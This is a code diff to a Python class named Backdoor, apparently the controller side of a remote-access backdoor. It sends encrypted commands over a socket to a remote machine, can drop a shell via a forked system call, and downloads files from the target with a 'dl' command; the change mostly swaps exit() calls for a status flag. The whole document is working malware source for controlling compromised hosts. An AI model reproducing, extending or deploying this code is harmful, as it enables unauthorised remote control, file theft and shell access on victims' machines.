@@ -1,15 +1,19 @@
 from sys import stderr, exit, stderr
 from os import system, listdir, fork, wait
 from socket import error as socket_error
+# lib
+from .crypto import Crypto 
 
 class Backdoor():
 
-    def __init__(self, conn, ip_addr, port, shell_port, crypto):
+    def __init__(self, conn, ip_addr, port, shell_port):
         self.conn = conn
         self.ip_addr = ip_addr
         self.port = port
         self.shell_port = shell_port
+        crypto = Crypto()
         self.crypto = crypto
+        self.status = 1
 
     def get_cmd(self):
         cmd = ""
@@ -24,7 +28,7 @@ class Backdoor():
             self.conn.send(encrypted_cmd)
         except socket_error:
             stderr.write("Error sending command\n")
-            exit(0)
+            self.status = 0
             
     def drop_shell(self):
         pid = fork()
@@ -36,7 +40,7 @@ class Backdoor():
             system(syscmd)
         else:
             wait()
-        exit(0)
+        self.status = 0 
 
     def recv_msg(self, buf):
         msg = ""
@@ -56,13 +60,9 @@ class Backdoor():
             self.drop_shell()
         elif cmd[:5] == "clear":
             system("clear")
-            msg = "\n"
+            msg = "ACK\n"
         elif cmd[:4] == "exit":
-            self.conn.close()
-            system("clear")
-            print("[*] Connection with %s:%d closed" % (self.ip_addr, self.port))
-            print("[*] Gracefully quitting ...")
-            exit(0)
+            self.status = 0
         elif cmd[:2] == "dl":
             self.send_cmd(cmd)
             msg = self.recv_msg(64000)
@@ -104,7 +104,7 @@ class Backdoor():
         self.validate_msg(msg)
             
     def cmd_shell(self):
-        while True:
+        while self.status != 0:
             cmd = self.get_cmd()
             msg = self.builtin_cmds(cmd)
             self.display_response(msg)
